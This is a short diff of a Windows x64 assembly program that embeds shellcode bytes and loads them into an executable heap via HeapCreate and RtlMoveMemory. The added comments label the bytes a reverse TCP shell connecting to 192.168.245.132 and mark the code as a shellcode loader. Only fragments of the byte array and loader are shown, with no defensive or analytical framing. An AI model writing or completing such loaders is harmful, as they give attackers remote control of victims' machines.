@@ -3,6 +3,7 @@ extrn HeapAlloc :PROC
 extrn RtlMoveMemory :PROC
 
 .data
+;shellcode reverse tcp connection to 192.168.245.132
 shellcode DB 48H,31H,0C9H,48H,81H,0E9H,0C6H,0FFH
 	DB 0FFH,0FFH,48H,8DH,05H,0EFH,0FFH,0FFH
 	DB 0FFH,48H,0BBH,72H,0B4H,30H,0EAH,8DH
@@ -82,9 +83,8 @@ lea rbx, endshellcode
 SUB rbx, rax
 MOV	shellcodelenght, rbx
 
-
+;;SHELLCODE LOADER
 ; Create a heap with HeapCreate
-;XOR rcx, rcx ; flOptions
 MOV rcx, 40000h
 MOV rdx, 1000h ; dwInitialSize
 MOV r8, 0 ; dwMaximumSize
